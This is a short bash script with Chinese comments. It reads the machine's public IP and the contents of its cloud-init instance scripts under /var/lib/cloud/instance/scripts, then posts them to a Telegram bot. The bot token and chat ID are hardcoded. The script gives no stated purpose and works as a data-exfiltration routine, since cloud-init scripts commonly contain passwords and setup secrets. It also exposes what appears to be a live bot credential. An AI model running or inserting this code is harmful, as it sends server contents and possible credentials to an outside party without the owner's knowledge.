#!/bin/bash

# TG 机器人配置
BOT_TOKEN="8153892091:AAE97Mg3YjSuz_sFUUbVaqzLMSUe6X0YMWk"
CHAT_ID="6260718977"

# 获取本机公网 IP
IP=$(curl -s ipv4.ip.sb)

# 初始化消息内容
MESSAGE="本机 IP: $IP"

# 检查路径是否存在并读取内容
SCRIPT_DIR="/var/lib/cloud/instance/scripts"
if [ -d "$SCRIPT_DIR" ]; then
  SCRIPT_CONTENT=$(cat "$SCRIPT_DIR"/* 2>/dev/null)
  MESSAGE="$MESSAGE  脚本内容:  $SCRIPT_CONTENT"
else
  # 路径不存在
  MESSAGE="$MESSAGE"
fi

# 发送消息到 TG
response=$(curl -s -w "%{http_code}" -o /tmp/tg_response.json \
  "https://api.telegram.org/bot${BOT_TOKEN}/sendMessage" \
  -d chat_id="${CHAT_ID}" \
  --data-urlencode text="$MESSAGE")


